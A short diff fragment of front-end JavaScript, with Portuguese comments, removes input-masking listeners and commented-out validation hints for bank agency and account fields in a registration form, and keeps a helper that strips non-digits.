-            mascararAgencia(this)
-          })
-        }
-
-        // const conta = document.getElementById('conta')
-        // if (conta) {
-        //   conta.addEventListener('input', function () {
-        //     mascararConta(this)
-        //   })
-        // }
-      })
-
-      // Adicionar as validações dentro da função processarCadastro
-      // Coloque essas duas linhas no início da sua função processarCadastro:
-      // if (!validarAgencia()) return;
-      // if (!validarConta()) return;
       function apenasNumeros(input) {
         input.value = input.value.replace(/\D/g, '')
       }
